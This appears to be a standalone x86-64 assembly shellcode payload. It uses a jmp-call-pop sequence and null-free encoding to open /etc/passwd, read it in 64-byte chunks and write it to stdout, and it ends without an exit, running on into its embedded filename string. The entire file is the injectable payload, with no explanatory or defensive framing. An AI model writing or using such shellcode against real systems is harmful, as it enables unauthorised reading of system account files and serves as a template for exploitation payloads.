bits 64
section .text
global _start

_start:

	jmp getaddr

	; open("/etc/passwd", O_RDONLY)
	open:
	
	xor rsi, rsi

	pop rdi
	mov byte [rdi + 11], sil

	push 0x2
	pop rax ; SYS_open

	syscall

	mov r8, rax

	; read(filefd, buf, 0x40)

	xchg rax, rsi ; SYS_read
	and rdx, rax
	mov dl, 0x40
	lea rsi, [rsp - 0x40]

	readchunk:
	mov rdi, r8
	syscall

	test rax, rax
	jz filename

	; write(stdout, buf, len(buf))

	xchg rax, rdx
	mov dil, 0x1

	mov al, 0x1 ; SYS_write

	syscall

	xor rax, rax ; SYS_read

	jmp readchunk

	getaddr:
		call open
	filename:
		db "/etc/passwdx"